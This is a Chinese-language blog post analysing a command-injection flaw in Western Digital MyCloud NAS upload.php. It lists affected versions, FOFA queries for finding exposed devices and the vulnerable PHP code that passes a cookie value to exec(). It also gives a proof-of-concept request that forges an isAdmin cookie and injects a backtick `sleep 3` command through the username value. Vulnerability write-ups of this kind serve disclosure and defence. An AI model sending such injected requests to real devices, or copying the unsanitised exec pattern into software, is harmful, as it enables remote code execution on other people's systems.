---
title: "西部数码 NAS php/upload.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-php-upload-rce.html
asset_dir: assets/西部数码-nas-phpupload.php-命令执行漏洞
---

# 西部数码 NAS php/upload.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/8 12:22
- 833浏览
- [0评论](#comment)
- 10分钟阅读

深入探索

Docker加速服务

漏洞扫描服务

Windows安全工具

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS upload.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞修复方案

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

直接看 `upload.php` 其业务实现逻辑如下

```
<?php
session_start();
$r = new stdClass();
$r->success = false;

include ("../lib/login_checker.php");

/* login_check() return 0: no login, 1: login, admin, 2: login, normal user */
if (login_check() != 1)
{
    echo json_encode($r);
    exit;
}

$username = $_COOKIE['username'];
exec("wto -n \"$username\" -g", $ret);
```

深入探索

漏洞扫描器

Nessus

网络安全培训

从 `$_COOKIE` 中获取 `username` 参数，在未进行任何过滤或转义的情况下，直接将其拼接到 `exec()` 函数执行的系统命令中，导致了[命令注入](https://mrxn.net/tag/rce)漏洞。尽管此漏洞需要管理员权限才能触发，但可以结合`login_check`的权限绕过达到 [RCE](https://mrxn.net/tag/rce)的效果。

# 漏洞复现

```
GET /web/php/upload.php HTTP/1.1
Host: west.nas.mrxn.net
Cookie: isAdmin=1;username=a" `sleep 3` "
```

[![西部数码 NAS php/upload.php 命令执行漏洞](images/img-001-271f22f49542.webp)](https://image.mrxn.net/904a383ef0864fed8d68ed9acaa010bb.webp)

成功延时 3 秒

- 标签：
- [#代码](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81)
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#php](https://mrxn.net/tag/php)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
